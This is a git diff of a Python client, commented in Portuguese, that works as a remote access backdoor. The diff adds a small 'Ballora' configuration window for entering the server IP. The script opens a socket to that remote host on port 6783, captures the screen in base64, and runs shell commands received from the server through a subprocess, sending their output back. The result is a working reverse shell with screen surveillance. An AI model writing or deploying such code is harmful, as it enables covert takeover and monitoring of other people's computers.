@@ -4,7 +4,30 @@ import base64
 from io import BytesIO
 from PIL import ImageGrab
 import pyautogui as pg
+import customtkinter as ctk
+targetIP = 0.0
+def getEntry():
+    global targetIP
+    targetIP = entry_1.get()
+    app.destroy()
 
+app = ctk.CTk()
+app.title("Ballora - Config.")
+ctk.set_default_color_theme("dark-blue")
+ctk.set_appearance_mode("dark")
+entry_1 = ctk.CTkEntry(
+    app,
+    placeholder_text="Informe o IP"
+)
+entry_1.pack()
+button_1 = ctk.CTkButton(
+    app,
+    text="Iniciar",
+    command= getEntry
+)
+button_1.pack()
+
+app.mainloop()
 
 def capturar_tela():
     screenshot = ImageGrab.grab()
@@ -13,7 +36,7 @@ def capturar_tela():
     return base64.b64encode(buffer.getvalue()).decode()  # Converte para base64
 
 client_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-client_socket.connect(('10.137.73.36', 6783))  # Conectando ao servidor
+client_socket.connect((f'{targetIP}', 6783))  # Conectando ao servidor
 
 while True:
     comando = client_socket.recv(1024).decode()
@@ -52,11 +75,13 @@ while True:
             saida, erro = processo.communicate()
             if saida:
                 resposta = saida
+                client_socket.sendall(resposta.encode())
             elif erro:
                 resposta = erro
+                client_socket.sendall(resposta.encode())
             else:
                 resposta = "Sem resposta"
-            client_socket.sendall(resposta.encode())
+                client_socket.sendall(resposta.encode())
         except Exception as e:
             client_socket.sendall(f"Erro ao executar comando: {str(e)}".encode())
 
